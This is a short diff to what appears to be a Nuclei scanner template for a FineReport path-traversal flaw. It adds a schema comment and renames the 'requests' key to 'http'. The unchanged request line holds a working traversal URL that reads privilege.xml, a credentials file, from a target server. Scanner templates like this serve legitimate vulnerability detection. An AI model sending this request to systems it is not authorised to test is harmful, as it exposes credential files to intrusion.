@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: finereport-path-traversal
 
 info:
@@ -8,7 +9,7 @@ info:
     - http://foreversong.cn/archives/1378
   tags: finereport,lfi
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
